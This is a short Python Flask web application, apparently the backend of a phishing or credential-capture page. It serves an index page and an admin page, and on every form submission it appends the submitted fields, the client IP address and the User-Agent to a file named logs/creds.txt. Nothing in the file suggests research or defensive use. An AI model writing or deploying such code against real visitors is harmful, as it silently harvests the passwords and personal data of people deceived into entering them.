from flask import Flask, request, render_template
import datetime
import os

app = Flask(__name__, static_folder='static', template_folder='templates')
os.makedirs('logs', exist_ok=True)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        log_line = f"{datetime.datetime.now()} || {dict(request.form)} || IP: {request.remote_addr} || UA: {request.headers.get('User-Agent')}\n"
        with open("logs/creds.txt", "a") as f:
            f.write(log_line)
    return render_template("index.html")

@app.route("/admin", methods=["GET", "POST"])
def admin():
    if request.method == "POST":
        log_line = f"ADMIN: {datetime.datetime.now()} || {dict(request.form)} || IP: {request.remote_addr} || UA: {request.headers.get('User-Agent')}\n"
        with open("logs/creds.txt", "a") as f:
            f.write(log_line)
    return render_template("admin.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
